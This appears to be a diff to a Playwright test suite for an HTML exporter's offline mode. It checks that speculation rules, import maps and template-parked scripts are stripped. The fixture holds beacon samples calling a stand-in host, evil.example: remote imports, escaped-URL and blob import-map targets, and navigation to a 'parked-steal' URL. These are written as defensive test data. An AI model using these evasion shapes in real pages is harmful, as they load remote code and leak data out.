@@ -692,7 +692,7 @@ test("a preserved inline script cannot beacon by navigating the offline file to 
     // Removing a script is content loss, so the user is told rather than left to guess - and the
     // COUNT must be right, or a miscount regression would read as a pass. Matched with a word
     // boundary, since a plain substring would also be satisfied by "14 scripts ... removed.".
-    await expect(page.locator("#toast")).toContainText(/\b4 scripts that load or navigate to the network were removed\./);
+    await expect(page.locator("#toast")).toContainText(/\b4 scripts that load, prefetch, or navigate to the network were removed\./);
     // A navigation that does still happen (a user-clicked link, or a script that builds the
     // URL dynamically) must at least not leak where it came from. The fixture authors a
     // PERMISSIVE `unsafe-url` policy both as a document meta and on the anchor itself, so this
@@ -2076,7 +2076,7 @@ test("CMH-OFFLINE-04: a decoy runnable script cannot bypass the offline strips b
     expect(exportedHtml).not.toContain("decoy-src.js");
     // Both outcomes are named to the author rather than left to be discovered.
     const toast = page.locator("#toast");
-    await expect(toast).toContainText(/\b2 scripts that load or navigate to the network were removed\./);
+    await expect(toast).toContainText(/\b2 scripts that load, prefetch, or navigate to the network were removed\./);
     await expect(toast).toContainText("4 scripts carrying a reserved commentable-html data id were kept as inert data.");
 
     const exportedPath = path.join(outDir, "offline-reserved-decoys.html");
@@ -2215,7 +2215,7 @@ test("CMH-OFFLINE-04: an SVG script that loads through href or xlink:href is str
     expect(networkLoadRefs(exportedHtml)).toEqual([]);
     // Removing a script is content loss, so it is named rather than silent - and the element
     // carrying TWO network attributes is counted once, not twice.
-    await expect(page.locator("#toast")).toContainText("8 scripts that load or navigate to the network were removed.");
+    await expect(page.locator("#toast")).toContainText("8 scripts that load, prefetch, or navigate to the network were removed.");
 
     const exportedPath = path.join(outDir, "offline-svg-script-href.html");
     fs.writeFileSync(exportedPath, exportedHtml);
@@ -2323,3 +2323,202 @@ test("CMH-OFFLINE-04: a reviewer comment quoting an egress shape survives, and a
     fs.rmSync(outDir, { recursive: true, force: true });
   }
 });
+
+// Two shapes both offline strips used to walk straight past. A `speculationrules` / `importmap`
+// block is ACTIVE but is not JavaScript, so the runnable-type predicate never looked at it; and
+// `querySelectorAll` does not descend into a `<template>`, whose content serialization preserves
+// verbatim and a second script can adopt and insert.
+const ACTIVE_DATA_TEMPLATE_CONTENT = [
+  "<h1>Active data blocks and template content</h1>",
+  '<p id="active-note">A speculation rule and an import map are active without being JavaScript.</p>',
+  // Every speculation ruleset goes: it exists only to make the browser fetch, and the third one
+  // here reaches the network through the document's OWN links without naming a URL at all, so no
+  // URL-shaped test could have caught it. The fourth is external and unreviewable.
+  '<script type="speculationrules">{"prerender": [{"urls": ["https://evil.example/prerender-beacon"]}]}</script>',
+  '<script type="speculationrules">{"prerender": [{"urls": ["local-next.html"]}]}</script>',
+  '<script type="speculationrules">{"prefetch": [{"source": "document", "eagerness": "immediate", "tag": "cmhDocSourceRuleset"}]}</script>',
+  '<script type="speculationrules" src="cmh-external-rules.json"></script>',
+  // An import map goes when any reference in it is not relative - in every spelling JSON allows,
+  // since the decision parses the body rather than reading its text - or when it is external.
+  '<script type="importmap">{"imports": {"beacon": "https://evil.example/importmap-beacon.js"}}</script>',
+  '<script type="importmap">{"imports": {"escaped": "https:\\u002f\\u002fevil.example/escaped-beacon.js"}}</script>',
+  '<script type="importmap">{"imports": {"backslash": "/\\\\evil.example/backslash-beacon.js"}}</script>',
+  '<script type="importmap">{"imports": {"blobbed": "blob:https://evil.example/blob-beacon"}}</script>',
+  '<script type="importmap">{"scopes": {"https://cdn.example/scoped-beacon/": {"x": "./x.js"}}}</script>',
+  '<script type="importmap">{"imports": {"broken": "./ok.js"} oops-invalid-json</script>',
+  '<script type="importmap" src="cmh-external-map.json"></script>',
+  // Local-only: preserved, exactly as a relative media reference is.
+  '<script type="importmap" id="localMap">{"imports": {"local-lib": "./local-lib.js"}}</script>',
+  // A MIME-parameter spelling is NOT the keyword type, so a browser treats it as inert data and
+  // so must the strip - deleting an author's inert block is the costlier error.
+  '<script type="importmap;charset=utf-8" id="paramMap">{"imports": {"inert": "https://evil.example/inert-data.js"}}</script>',
+  // A template parked with everything the strips are supposed to take away.
+  '<template id="hostileTemplate">',
+  '  <script type="text/javascript" id="parkedBeacon">',
+  "    window.__cmhParkedRan = true;",
+  '    import("https://evil.example/parked.js").catch(function () {});',
+  '    location.href = "https://evil.example/parked-steal";',
+  "  <\/script>",
+  '  <script type="importmap">{"imports": {"parked": "https://evil.example/parked-map.js"}}</script>',
+  '  <script type="text/javascript" id="reviewedSections">window.__cmhParkedReservedRan = true;</script>',
+  '  <img id="parkedImg" alt="parked" src="https://evil.example/parked-pixel.png">',
+  "  <style>.parked { background-image: url(https://evil.example/parked-bg.png); }</style>",
+  '  <button id="parkedBtn" onclick="location.href=\'https://evil.example/parked-click\'">go</button>',
+  // A second template INSIDE the first: the walk recurses, and the outermost template stays the
+  // anchor, which is what the kept-as-inert count is judged against.
+  '  <template id="nestedTemplate">',
+  '    <script type="text/javascript" id="nestedBeacon">',
+  "      window.__cmhNestedRan = true;",
+  '      import("https://evil.example/nested.js").catch(function () {});',
+  "    <\/script>",
+  '    <script type="text/javascript" id="handledCommentIds">window.__cmhNestedReservedRan = true;</script>',
+  "  </template>",
+  "</template>",
+  // The control: a template a document legitimately uses must come through undamaged.
+  '<template id="benignTemplate">',
+  '  <script type="text/javascript" id="benignParked">window.__cmhBenignParkedRan = true;<\/script>',
+  '  <script type="importmap">{"imports": {"benign": "./benign.js"}}</script>',
+  '  <img id="benignImg" alt="benign" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=">',
+  "  <style>.benign { color: #123456; }</style>",
+  "</template>",
+].join("\n");
+
+test("CMH-OFFLINE-04: the offline strips inspect speculationrules, importmap, and template content", async ({ page, browser }) => {
+  test.setTimeout(90000);
+  const staged = stageContent(ACTIVE_DATA_TEMPLATE_CONTENT, { key: "cmh-offline-active-data", source: "offline-active-data.html" });
+  const server = await startStaticServer(staged.dir);
+  const outDir = makeTmpDir();
+  let ctx2;
+  try {
+    await page.route(/^https?:\/\//, async (route) => {
+      const url = route.request().url();
+      if (/^https?:\/\/(localhost|127\.0\.0\.1)(:|\/)/.test(url)) return route.fallback();
+      return route.abort();
+    });
+    await installDownloadTextCapture(page);
+    await page.goto(server.url + "/test-doc.html");
+    await ready(page);
+    await openToolbarMenu(page);
+    await Promise.all([
+      page.waitForEvent("download"),
+      page.locator("#btnExportOfflineTop").click(),
+    ]);
+    const exportedHtml = await capturedDownloadText(page);
+
+    // Every speculation ruleset is gone, whether it named a network URL, a local one, nothing at
+    // all, or an external file - the URL-less shape is the one no URL test could have caught.
+    expect(exportedHtml, "a network speculation rule is removed").not.toContain("prerender-beacon");
+    expect(exportedHtml, "a local speculation rule is removed too").not.toContain("local-next.html");
+    expect(exportedHtml, "a document-source ruleset is removed").not.toContain("cmhDocSourceRuleset");
+    expect(exportedHtml, "an external ruleset is removed").not.toContain("cmh-external-rules.json");
+    // An import map goes for any non-local reference, in any spelling, and when it is external or
+    // unparseable.
+    expect(exportedHtml, "a network import map is removed").not.toContain("importmap-beacon.js");
+    expect(exportedHtml, "a \\u-escaped target is removed").not.toContain("escaped-beacon.js");
+    expect(exportedHtml, "a backslash-authority target is removed").not.toContain("backslash-beacon.js");
+    expect(exportedHtml, "a blob: target is removed").not.toContain("blob-beacon");
+    expect(exportedHtml, "a network scopes KEY is a reference too").not.toContain("scoped-beacon");
+    expect(exportedHtml, "an unparseable map fails closed").not.toContain("oops-invalid-json");
+    expect(exportedHtml, "an external import map is removed").not.toContain("cmh-external-map.json");
+    expect(exportedHtml, "a template-parked network import map is removed").not.toContain("parked-map.js");
+    // The local one is content and survives untouched, and so does the parameterized spelling,
+    // which is inert data to a browser rather than an import map at all.
+    expect(exportedHtml, "a local import map is preserved").toContain("./local-lib.js");
+    expect(exportedHtml, "a parameterized type is inert data, not an import map").toContain("inert-data.js");
+    // The template-parked script that beacons is stripped like any other runnable script.
+    expect(exportedHtml, "a template-parked egress script is removed").not.toContain("evil.example/parked.js");
+    expect(exportedHtml).not.toContain("parked-steal");
+    expect(exportedHtml, "a template-parked network image is neutralized").not.toContain("parked-pixel.png");
+    expect(exportedHtml, "template-parked CSS is scrubbed").not.toContain("parked-bg.png");
+    expect(exportedHtml, "a template-parked event handler is removed").not.toContain("parked-click");
+    expect(exportedHtml, "a script two templates deep is removed").not.toContain("evil.example/nested.js");
+    // The benign template comes through whole.
+    expect(exportedHtml, "a legitimate template survives").toContain("__cmhBenignParkedRan");
+    expect(exportedHtml).toContain("./benign.js");
+    expect(exportedHtml).toContain(".benign { color: #123456; }");
+    // Both quiet outcomes are named to the author rather than left to be discovered. The removed
+    // count is 4 rulesets (network, local, document-source, external) + 7 import maps (network,
+    // escaped, backslash, blob, scopes key, invalid, external) + the template-parked import map +
+    // the parked beacon + the nested beacon; the kept count is the two template-parked reserved-id
+    // blocks (one at each depth).
+    const toast = page.locator("#toast");
+    await expect(toast).toContainText("14 scripts that load, prefetch, or navigate to the network were removed.");
+    await expect(toast).toContainText("2 scripts carrying a reserved commentable-html data id were kept as inert data.");
+
+    const exportedPath = path.join(outDir, "offline-active-data.html");
+    fs.writeFileSync(exportedPath, exportedHtml);
+    // The exporter and its own strict gate agree in both directions: nothing it left behind is a
+    // shape the gate rejects, and the gate now sees template content and active data blocks too.
+    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });
+
+    ctx2 = await browser.newContext();
+    const page2 = await ctx2.newPage();
+    const external = [];
+    await page2.route(/^https?:\/\//, async (route) => {
+      external.push(route.request().url());
+      await route.abort();
+    });
+    await page2.goto(fileUrl(exportedPath));
+    await ready(page2);
+    // Adopting the fragments is what makes a parked script run, so drive exactly that: the
+    // hostile template must have nothing left to run, and the benign one must still work.
+    const adopted = await page2.evaluate(() => {
+      const out = { reservedTypes: [], localMapParses: false };
+      const readReserved = (root) => {
+        root.querySelectorAll("script[id]").forEach((s) => {
+          if (s.id === "reviewedSections" || s.id === "handledCommentIds") {
+            out.reservedTypes.push(s.id + ":" + (s.getAttribute("type") || ""));
+          }
+        });
+        root.querySelectorAll("template").forEach((t) => readReserved(t.content));
+      };
+      for (const id of ["hostileTemplate", "benignTemplate"]) {
+        const t = document.getElementById(id);
+        out[id] = !!t;
+        if (t) {
+          readReserved(t.content);
+          document.body.appendChild(t.content.cloneNode(true));
+        }
+      }
+      // Adopting the outer fragment only inserts the inner <template>; adopt that too, so a script
+      // parked two levels deep would genuinely get its chance to run.
+      document.querySelectorAll("body > template, #nestedTemplate").forEach((t) => {
+        document.body.appendChild(t.content.cloneNode(true));
+      });
+      // The preserved import map is still a live, parseable import map element - not just bytes
+      // that happen to survive. (A bare-specifier module cannot be driven end to end here: a
+      // `file://` document cannot load a module at all, which is why this is the strongest
+      // available check that the kept map is undamaged.)
+      const kept = document.getElementById("localMap");
+      out.localMapType = kept && kept.getAttribute("type");
+      try { out.localMapParses = !!JSON.parse(kept.textContent).imports["local-lib"]; } catch (e) { /* stays false */ }
+      out.parkedRan = !!window.__cmhParkedRan;
+      out.parkedReservedRan = !!window.__cmhParkedReservedRan;
+      out.nestedRan = !!window.__cmhNestedRan;
+      out.nestedReservedRan = !!window.__cmhNestedReservedRan;
+      out.benignRan = !!window.__cmhBenignParkedRan;
+      return out;
+    });
+    expect(adopted.hostileTemplate, "the template element itself is preserved").toBe(true);
+    expect(adopted.benignTemplate).toBe(true);
+    expect(adopted.parkedRan, "the parked beacon must have nothing left to run").toBe(false);
+    expect(adopted.nestedRan, "a beacon two templates deep must be gone too").toBe(false);
+    expect(adopted.localMapType, "the kept import map is still an import map").toBe("importmap");
+    expect(adopted.localMapParses, "the kept import map still parses to its local mapping").toBe(true);
+    // A reserved-id block keeps its bytes and loses only the ability to run, inside a template -
+    // at any depth - exactly as outside one.
+    expect(adopted.reservedTypes.sort()).toEqual([
+      "handledCommentIds:application/json", "reviewedSections:application/json"]);
+    expect(adopted.parkedReservedRan).toBe(false);
+    expect(adopted.nestedReservedRan).toBe(false);
+    expect(adopted.benignRan, "a legitimate template script still runs when adopted").toBe(true);
+    expect(page2.url()).toBe(fileUrl(exportedPath));
+    expect(external).toEqual([]);
+  } finally {
+    if (ctx2) await ctx2.close();
+    await server.close();
+    fs.rmSync(staged.dir, { recursive: true, force: true });
+    fs.rmSync(outDir, { recursive: true, force: true });
+  }
+});
+
